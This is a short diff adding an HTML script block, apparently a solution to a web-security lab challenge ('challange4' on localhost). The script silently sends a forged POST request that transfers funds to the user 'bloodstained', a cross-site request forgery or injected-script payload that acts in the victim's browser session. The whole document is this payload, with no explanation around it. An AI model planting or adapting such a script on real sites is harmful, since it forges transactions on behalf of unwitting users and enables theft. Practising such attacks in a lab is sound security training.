@@ -1,0 +1,8 @@
+<script>
+    var http = new XMLHttpRequest();
+    var url = "http://localhost:3003/challange4.html";
+    var params = "username=bloodstained&funds=1";
+    http.open("POST", url, true);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.send(params);
+</script>
